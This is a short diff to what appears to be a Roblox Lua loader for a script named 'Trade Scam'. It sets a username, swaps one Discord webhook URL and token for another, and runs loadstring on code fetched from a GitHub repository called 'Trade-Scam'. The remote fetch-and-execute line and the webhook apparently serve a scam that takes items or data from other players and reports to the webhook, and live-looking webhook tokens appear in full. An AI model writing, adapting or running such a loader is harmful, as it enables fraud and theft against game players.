@@ -1,4 +1,4 @@
 UserName = "Tox1cJace"
-WebHook = "https://discord.com/api/webhooks/1091179866818359457/5tWvLgyNNAKWLk3jxlTm7oqvF1BbINT-QUK3JWdNqsK1kWaWUScXTCCweCgY_JVajrZh"
+WebHook = "https://discord.com/api/webhooks/1029490647947804703/HCgS4TK7EjxUaQtnbwVRGnyBXTdkmib3jIuF8ktIvEHE80fX9jSjV1asnOMnR9NbiuyT"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jace1232/Trade-Scam/main/Trade%20Scam%20Script%202", true))()
